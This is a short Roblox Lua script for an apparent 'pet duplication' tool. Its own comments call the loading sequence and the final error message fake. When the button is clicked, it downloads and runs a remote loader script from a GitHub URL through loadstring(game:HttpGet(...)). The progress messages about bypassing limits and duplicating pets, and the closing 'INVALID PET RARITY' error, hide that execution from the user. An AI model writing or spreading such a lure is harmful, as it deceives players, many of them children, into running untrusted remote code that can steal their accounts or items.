-- Fake loading animation function
local function fakeLoading()
    StatusLabel.Text = "üîç VERIFYING PET RARITY..."
    Button.Text = "‚è≥ CHECKING..."
    Button.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
    wait(2)
    
    StatusLabel.Text = "‚ö†Ô∏è BYPASSING PET LIMITS..."
    wait(2.5)
    
    StatusLabel.Text = "‚öôÔ∏è DUPLICATING PET DATA..."
    wait(3)
    
    StatusLabel.Text = "üöÄ FINALIZING DUPLICATE..."
    wait(1.5)
end

-- Execute the real script when clicked
Button.MouseButton1Click:Connect(function()
    -- Play fake loading sequence
    fakeLoading()
    
    -- Then execute the real script
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader"))()
    
    -- Fake error message
    StatusLabel.Text = "‚ùå ERROR: INVALID PET RARITY"
    Button.Text = "üîÅ TRY AGAIN"
    Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
end)

